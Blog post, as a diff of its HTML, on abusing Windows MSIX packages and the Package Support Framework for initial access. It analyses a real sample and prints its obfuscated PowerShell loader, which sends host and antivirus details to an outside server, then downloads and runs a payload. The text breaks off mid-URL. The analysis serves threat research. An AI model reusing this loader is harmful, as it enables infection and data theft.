@@ -1,1 +1,546 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Creating malicious .MSIX files for initial access // Engineer Dancun</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Dancun Manyinsa" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://devopsengineerdan.github.io/css/main.min.d5ed8558bcfb3aab1e3d1790fb902decbac1f989a0d27aa3b2a2320773186707.css" />
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Creating malicious .MSIX files for initial access"/>
+<meta name="twitter:description" content="Creating malicious .MSIX files for initial access  Table of Contents   Introduction The MSIX File Format  Package Payload Footprint Files   Package Support Framework  StartingScriptWrapper.ps1   Analysis of a malicious sample  AppxManifest Config.json StartingScriptWrapper usJzY The Target Script   Building a malicious msix for Initial Access  Setting up the MSIX packaging tool and our setup file The implant being staged Create an SSL certificate Bundle the package and stage our loader   Testing our malicious sample  Introduction  I recently worked on a project involving adversary emulation of the BlackCat/ALPHV ransomware operation."/>
+
+    <meta property="og:title" content="Creating malicious .MSIX files for initial access" />
+<meta property="og:description" content="Creating malicious .MSIX files for initial access  Table of Contents   Introduction The MSIX File Format  Package Payload Footprint Files   Package Support Framework  StartingScriptWrapper.ps1   Analysis of a malicious sample  AppxManifest Config.json StartingScriptWrapper usJzY The Target Script   Building a malicious msix for Initial Access  Setting up the MSIX packaging tool and our setup file The implant being staged Create an SSL certificate Bundle the package and stage our loader   Testing our malicious sample  Introduction  I recently worked on a project involving adversary emulation of the BlackCat/ALPHV ransomware operation." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://devopsengineerdan.github.io/posts/msix/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-11-12T23:43:31+03:00" />
+<meta property="article:modified_time" content="2024-11-12T23:43:31+03:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://devopsengineerdan.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Dancun Manyinsa" /></a>
+      <h1>Engineer Dancun</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="https://devopsengineerdan.github.io/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="https://devopsengineerdan.github.io/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="https://devopsengineerdan.github.io/about/">About</a>
+      </nav>
+      <p>Software Engineer, Researcher(AI and Quantum Science), and Habitual Quant</p>
+      <div class="app-header-social">
+        
+          <a href="https://www.github.com/DancunManyinsa" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/dancun-manyinsa-42518a17b/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+          <a href="mailto:dancunmoruri@gmail.com" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Creating malicious .MSIX files for initial access</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 12, 2024
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          9 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://devopsengineerdan.github.io/tags/cybersecurity/">cybersecurity</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <hr>
+<h1 id="creating-malicious-msix-files-for-initial-access">Creating malicious .MSIX files for initial access</h1>
+<p><img src="https://github.com/user-attachments/assets/29621ee8-2024-4789-b61b-7aab24927f0d" alt="msix1"></p>
+<blockquote>
+<h3 id="table-of-contents">Table of Contents</h3>
+</blockquote>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#the-msix-file-format">The MSIX File Format</a>
+<ul>
+<li><a href="#package-payload">Package Payload</a></li>
+<li><a href="#footprint-files">Footprint Files</a></li>
+</ul>
+</li>
+<li><a href="#package-support-framework">Package Support Framework</a>
+<ul>
+<li><a href="#startingscriptwrapperps1">StartingScriptWrapper.ps1</a></li>
+</ul>
+</li>
+<li><a href="#analysis-of-a-malicious-sample">Analysis of a malicious sample</a>
+<ul>
+<li><a href="#appxmanifest">AppxManifest</a></li>
+<li><a href="#configjson">Config.json</a></li>
+<li><a href="#startingscriptwrapper">StartingScriptWrapper</a></li>
+<li><a href="#usjzy-the-target-script">usJzY The Target Script</a></li>
+</ul>
+</li>
+<li><a href="#building-a-malicious-msix-for-initial-access">Building a malicious msix for Initial Access</a>
+<ul>
+<li><a href="#setting-up-the-msix-packaging-tool-and-our-setup-file">Setting up the MSIX packaging tool and our setup file</a></li>
+<li><a href="#the-implant-being-staged">The implant being staged</a></li>
+<li><a href="#create-an-ssl-certificate">Create an SSL certificate</a></li>
+<li><a href="#bundle-the-package-and-stage-our-loader">Bundle the package and stage our loader</a></li>
+</ul>
+</li>
+<li><a href="#testing-our-malicious-sample">Testing our malicious sample</a></li>
+</ul>
+<h2 id="introduction">Introduction</h2>
+<ul>
+<li>I recently worked on a project involving adversary emulation of the <code>BlackCat/ALPHV ransomware operation</code>. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a Windows installer package.</li>
+<li>In this article, we will go over the <code>.msix</code> file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.</li>
+</ul>
+<h2 id="the-msix-file-format">The MSIX File Format</h2>
+<ul>
+<li>
+<p>Packaging of files in Windows has undergone several changes over the course of years which has led to the rise of various packaging file formats such as the <code>EXE, MSI, APPX</code> and a newer generation such as the MSIX which combines features from the MSI and the APPX packaging.</p>
+</li>
+<li>
+<p>Packaging is important for delivery and distribution of applications as it enables a simplified way of deploying and installing files by packaging all the necessary components and libraries into a single package that is straightforward to use.</p>
+</li>
+<li>
+<p>The general MSIX file format can be deconstructed as shown:</p>
+</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/0dfcff2d-459c-4ae2-8fa7-02691754650b" alt="msix2"></p>
+<h3 id="package-payload">Package Payload</h3>
+<ul>
+<li><code>Application Files</code>: This section contains the necessary applications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file.</li>
+</ul>
+<h3 id="footprint-files">Footprint Files</h3>
+<ul>
+<li><code>AppxManifest.xml</code>: This file contains metadata about the app package such as the entry points, capabilities, names of the package, version, publisher, dependencies, etc.</li>
+<li><code>AppxBlockMap.xml</code>: To ensure file integrity, this file will contain the checksums of all the files in the package</li>
+<li><code>AppxSignature.p7x</code>: The digital signature verifying the publisher’s identity and ensures that a package has not been tampered with</li>
+<li><code>CodeIntegrity.cat</code>: This file keeps a cryptographic catalogue file(hence the extension name) to ensure integrity and security of the package</li>
+</ul>
+<h2 id="package-support-framework">Package Support Framework</h2>
+<ul>
+<li>The <code>Package Support Framework (PSF)</code>, is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.</li>
+<li>It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/f2c7cabe-6330-4bd1-a58d-e11b0a5f2d6e" alt="msix3"></p>
+<ul>
+<li>
+<p>In the diagram above, we see the interaction between the PSF and the packaged application at runtime. Let’s discuss the various components.</p>
+<ul>
+<li><code>Config.JSON</code>: Contains settings and parameters for the PSF.</li>
+<li><code>PsfLauncher.exe</code>: The initial launcher that initiates the framework.</li>
+<li><code>Runtime Manager dll</code>: Dll responsible for managing runtime operations within the framework</li>
+<li><code>Runtime fix dll</code>: Dll that provides runtime fixes and patches required by the application</li>
+</ul>
+</li>
+</ul>
+<h3 id="startingscriptwrapperps1">StartingScriptWrapper.ps1</h3>
+<ul>
+<li><code>PSF</code> can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run.</li>
+<li>To perform this, a configuration item called the <code>StartingScriptWrapper</code> can be defined to tell PSF to run a script after the packaged application finishes installing.</li>
+<li>We can use this to run scripts to stage our implants for Initial Access</li>
+</ul>
+<h2 id="analysis-of-a-malicious-sample">Analysis of a malicious sample</h2>
+<ul>
+<li>Let us look at a malicious <a href="https://bazaar.abuse.ch/verify-ua/">sample</a> from malwarebazaar.</li>
+<li>Once you’ve downloaded and unzipped the sample, you will be presented with the following folder structure.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/8657d334-40b2-44bd-bce6-6fddaa93548f" alt="msix4"></p>
+<ul>
+<li>
+<p>In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure its correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.</p>
+</li>
+<li>
+<p>4 files are of interest to us:</p>
+<ol>
+<li>AppxManifest</li>
+<li>Config.json</li>
+<li>StartingScriptWrapper</li>
+<li>usJzY The Target Script</li>
+</ol>
+</li>
+</ul>
+<h3 id="appxmanifest">AppxManifest</h3>
+<ul>
+<li>I highlighted 2 important sections here. The properties and the applications section.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/13fdc262-1d82-4e06-a7a9-b6b35aa1d40c" alt="msix5"></p>
+<ul>
+<li>The <code>properties</code> section contains details identifying the application such as the name, description and the logo that the app uses.</li>
+<li>In the <code>applications</code> section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.</li>
+<li>The <code>Capabilities section</code> is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the <code>runFullTrust</code> capability.</li>
+</ul>
+<h3 id="configjson">Config.json</h3>
+<ul>
+<li>This is where things start to get interesting. We can see the various parameters being used in the configuration</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/07e29470-cc18-4176-be78-c66130ff22a5" alt="msix6"></p>
+<ol>
+<li>The PSF executable will be launched.</li>
+<li><code>scriptExecutionMode</code> has been set to <code>RemoteSigned</code>, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.</li>
+<li>The <code>start script</code> section defines usJzY.ps1 as the script that will be executed at the start.</li>
+<li><code>showWindow</code> has been set to <code>false</code>, meaning the powershell script will run in the background without invoking the command window.</li>
+</ol>
+<h3 id="startingscriptwrapper">StartingScriptWrapper</h3>
+<ul>
+<li>The <code>StartingScriptWrapper</code> is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/7ccdd0c6-1211-45f7-9598-de608f6c0d31" alt="msix7"></p>
+<h3 id="usjzy-the-target-script">usJzY The Target Script</h3>
+<ul>
+<li>Finally, we have the target script that is being executed by PSF.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s"><span style="color:#f92672">$</span>udGXjGVXGXbtYwiRfqjVk <span style="color:#f92672">=</span> Start<span style="color:#f92672">-</span>Job <span style="color:#f92672">-</span>ScriptBlock {
+    <span style="color:#f92672">$</span>SyXSoDNGGAhAAe <span style="color:#f92672">=</span> (Get<span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Class Win32_OperatingSystem).Caption
+    <span style="color:#f92672">$</span>Cg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;25&#39;</span>
+    <span style="color:#f92672">$</span>BmeBoy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;39b24536-f33f-48ee-9d63-4723e42e16f9&#39;</span>
+    <span style="color:#f92672">$</span>hr <span style="color:#f92672">=</span> [System.Net.WebUtility]<span style="color:#f92672">::</span><span style="color:#a6e22e">UrlEncode</span>(<span style="color:#f92672">$</span>SyXSoDNGGAhAAe)
+    <span style="color:#f92672">$</span>hhowUyysZxUVhmaQelBiPDRiUn <span style="color:#f92672">=</span> Get<span style="color:#f92672">-</span>WmiObject Win32_ComputerSystem <span style="color:#f92672">|</span> Select<span style="color:#f92672">-</span>Object <span style="color:#f92672">-</span>ExpandProperty Domain
+    <span style="color:#f92672">$</span>LhvJgxbikeJRfx <span style="color:#f92672">=</span> Get<span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace <span style="color:#e6db74">&#34;root\SecurityCenter2&#34;</span> <span style="color:#f92672">-</span>Class AntiVirusProduct
+    <span style="color:#f92672">$</span>JDJDUfKZAfHGJBoPloDnifXiw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>LhvJgxbikeJRfx <span style="color:#f92672">|</span> ForEach<span style="color:#f92672">-</span>Object {
+        <span style="color:#f92672">$</span>_.displayName
+    }
+    <span style="color:#f92672">$</span>mYoLehsZuDcJpwtZYnRgAIIgo <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>JDJDUfKZAfHGJBoPloDnifXiw <span style="color:#f92672">-</span>join <span style="color:#e6db74">&#34;, &#34;</span>
+    <span style="color:#f92672">$</span>lXDhTMDJqSAFnn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;w&#34;</span>
+    <span style="color:#f92672">$</span>HKDoaKaxv <span style="color:#f92672">=</span> (New<span style="color:#f92672">-</span>Guid)<span style="color:#a6e22e">.ToString</span>()
+    <span style="color:#f92672">$</span>aTebwwaowsbbrUUTopUZpsjZ <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span>Object Net.WebClient
+    <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.Headers.Add</span>(<span style="color:#e6db74">&#34;User-Agent&#34;</span>, <span style="color:#e6db74">&#34;myUserAgentHere&#34;</span>)
+    <span style="color:#f92672">$</span>YpU <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?oELLrQJKoZhtDhWs=$mYoLehsZuDcJpwtZYnRgAIIgo&amp;UyMWxrWzgLjhkx=$hhowUyysZxUVhmaQelBiPDRiUn&amp;dVLdrGnckGwZJ=$hr&amp;vKRZZRK=$($Cg)&amp;pHHpfHApJIsnDpyQxHyJTHfM=$BmeBoy&amp;File=file&amp;AeAypRLxCibLOehARxuqWNR=$lXDhTMDJqSAFnn&amp;IhU=$HKDoaKaxv&#34;</span>
+    <span style="color:#f92672">$</span>UJOBBmKBtPlyyQBndyytBczBv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;eprst251.boo/73689d8a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;25b4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;41cf&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;b693&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;05591ed804a7&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;7433f7b1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;9997&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;477b&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;aadc&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;5a6e8d233c61&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$($YpU)&#34;</span>
+    <span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.DownloadString</span>(<span style="color:#f92672">$</span>UJOBBmKBtPlyyQBndyytBczBv)
+    <span style="color:#f92672">$</span>viSrdkNrrPrYdF <span style="color:#f92672">=</span> [System.Text.Encoding]<span style="color:#f92672">::</span><span style="color:#a6e22e">Unicode.GetString</span>([System.Convert]<span style="color:#f92672">::</span><span style="color:#a6e22e">FromBase64String</span>(<span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw))
+    <span style="color:#f92672">$</span>gysZgsffxZppKIgfHU <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;usradm&#34;</span>
+    <span style="color:#a6e22e">if </span>(<span style="color:#f92672">$</span><span style="color:#a6e22e">viSrdkNrrPrYdF.Contains</span>(<span style="color:#f92672">$</span>gysZgsffxZppKIgfHU)) {
+
+        try {
+
+            <span style="color:#f92672">$</span>LQ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RpVpRNJ.ps1&#34;</span>
+            <span style="color:#f92672">$</span>K <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\ProgramData\$($LQ)&#34;</span>
+            <span style="color:#f92672">$</span>viSrdkNrrPrYdF <span style="color:#f92672">|</span> Out<span style="color:#f92672">-</span>File <span style="color:#f92672">-</span>FilePath <span style="color:#f92672">$</span>K
+            <span style="color:#f92672">$</span>CoNC <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>LQ
+            <span style="color:#f92672">$</span>YpU <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?KblgSClgegJMev=$($LQ)&amp;pHHpfHApJIsnDpyQxHyJTHfM=$($BmeBoy)&#34;</span>
+            <span style="color:#f92672">$</span>BvikSaFXwYDk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;eprst251.b&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;o&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;o&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/bb9c1a14-4e3d-40ab-bcc8-0b84e78255b0-4bed9ff2-0f4e-48fb-92ed-1065fcd85e01&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$($YpU)&#34;</span>
+            <span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.DownloadString</span>(<span style="color:#f92672">$</span>BvikSaFXwYDk)
+            <span style="color:#f92672">$</span>viSrdkNrrPrYdF <span style="color:#f92672">=</span> [System.Text.Encoding]<span style="color:#f92672">::</span><span style="color:#a6e22e">Unicode.GetString</span>([System.Convert]<span style="color:#f92672">::</span><span style="color:#a6e22e">FromBase64String</span>(<span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw))
+            Invoke<span style="color:#f92672">-</span>Expression <span style="color:#f92672">$</span>viSrdkNrrPrYdF
+        }
+        catch {
+            <span style="color:#f92672">$</span>HcEAjXEDFgAUtMMiPwLicU <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>_.Exception.Message
+            <span style="color:#f92672">$</span>icFJZsoaoaorsrDtZWvtoFQitW <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?IhU=$($HKDoaKaxv)&amp;HZsZsos=$($HcEAjXEDFgAUtMMiPwLicU)&#34;</span>
+            <span style="color:#f92672">$</span>jmtjjvjr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;prst251.boo/223dc805-5605-4a0b-b828-cdad1b84126&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-79d39c2c-0f10-48d1-9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;df-c18a784&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;fba0&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$($icFJZsoaoaorsrDtZWvtoFQitW)&#34;</span>
+            <span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.DownloadString</span>(<span style="color:#f92672">$</span>jmtjjvjr)
+            try {
+                <span style="color:#f92672">$</span>NToddpkHJ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?aklshdjahsjdh=$($Cg)&amp;ajhsdjhasjhd=nsp&amp;ahsdjkasjkdh=$($($HKDoaKaxv))&#34;</span>
+                <span style="color:#f92672">$</span>NQdQ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;t&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;o&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;o&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;7&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;8&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">+</span><span 